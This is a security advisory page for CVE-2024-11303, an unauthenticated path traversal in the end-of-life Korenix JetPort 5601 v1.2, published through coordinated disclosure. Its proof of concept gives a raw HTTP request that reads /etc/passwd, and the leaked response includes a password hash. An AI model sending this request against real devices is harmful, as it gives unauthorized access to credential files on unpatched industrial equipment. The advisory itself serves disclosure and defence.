---
title: Korenix JetPort 5601 1.2 Path Traversal
url: https://cxsecurity.com/issue/WLB-2024110036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-26
fetch_date: 2025-10-06T19:17:06.285219
---

# Korenix JetPort 5601 1.2 Path Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Korenix JetPort 5601 1.2 Path Traversal** **2024.11.25**  Credit:  **[Hierzer](https://cxsecurity.com/author/Hierzer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-11303](https://cxsecurity.com/cveshow/CVE-2024-11303/ "Click to see CVE-2024-11303")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

St. Plten UAS 20241118-1
-------------------------------------------------------------------------------
title| Path Traversal
product| Korenix JetPort 5601
vulnerable version| 1.2
fixed version| -
CVE number| CVE-2024-11303
impact| High
homepage| https://www.korenix.com/
found| 2024-05-24
by| P. Oberndorfer, B. Tsch, M. Narbeshuber-Spletzer,
| C. Hierzer, M. Pammer
| These vulnerabilities were discovery during research at
| St.Plten UAS, supported and coordinated by CyberDanube.
|
| https://fhstp.ac.at | https://cyberdanube.com
-------------------------------------------------------------------------------
Vendor description
-------------------------------------------------------------------------------
"Korenix Technology, a Beijer group company within the Industrial Communication
business area, is a global leading manufacturer providing innovative, market-
oriented, value-focused Industrial Wired and Wireless Networking Solutions.
With decades of experiences in the industry, we have developed various product
lines [...].
Our products are mainly applied in SMART industries: Surveillance, Machine-to-
Machine, Automation, Remote Monitoring, and Transportation. Worldwide customer
base covers different Sales channels, including end-customers, OEMs, system
integrators, and brand label partners. [...]"
Source: https://www.korenix.com/en/about/index.aspx?kind=3
Vulnerable versions
-------------------------------------------------------------------------------
Korenix JetPort 5601v3 / v1.2
Vulnerability overview
-------------------------------------------------------------------------------
1) Path Traversal (CVE-2024-11303)
A path traversal attack for unauthenticated users is possible. This allows
getting access to the operating system of the device and access information
like configuration files and connections to other hosts or potentially other
sensitive information.
Proof of Concept
-------------------------------------------------------------------------------
1) Path Traversal (CVE-2024-11303)
By sending the following request to the following endpoint, a path traversal
vulnerability can be triggered:
-------------------------------------------------------------------------------
GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 10.69.10.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Te: trailers
Connection: keep-alive
-------------------------------------------------------------------------------
Note, that this is only possible when an interceptor proxy or a command line
tool is used. A web browser would encode the characters and the path traversal
would not work.
The response to the latter request is shown below:
-------------------------------------------------------------------------------
HTTP/1.1 200 OK
Server: thttpd/2.19-MX Jun 2 2022
Content-type: text/plain; charset=iso-8859-1
[...]
Accept-Ranges: bytes
Connection: Keep-Alive
Content-length: 86
root::0:0:root:/root:/bin/false
admin:$1$$CoERg7ynjYLsj2j4glJ34.:502:502::/:/bin/true
-------------------------------------------------------------------------------
The vulnerabilities were manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).
Solution
-------------------------------------------------------------------------------
None. Device is End-of-Life.
Workaround
-------------------------------------------------------------------------------
Limit the access to the device and place it within a segmented network.
Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends Korenix customers to upgrade to another device.
Contact Timeline
-------------------------------------------------------------------------------
2024-09-23: Contacting Beijer Electronics Group via cs@beijerelectronics.com.
2024-09-24: Vendor stated, that the device is end-of-life. Contact will ask the
engineering team if there are any changes.
2024-10-15: Vendor stated, that the advisory can be published. No further
updates are planned for this device.
2024-11-18: Coordinated disclosure of advisory.
Web: https://www.fhstp.ac.at/
Twitter: https://x.com/fh\_stpoelten
Mail: mis@fhstp.ac.at
EOF T. Weber / @2024

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top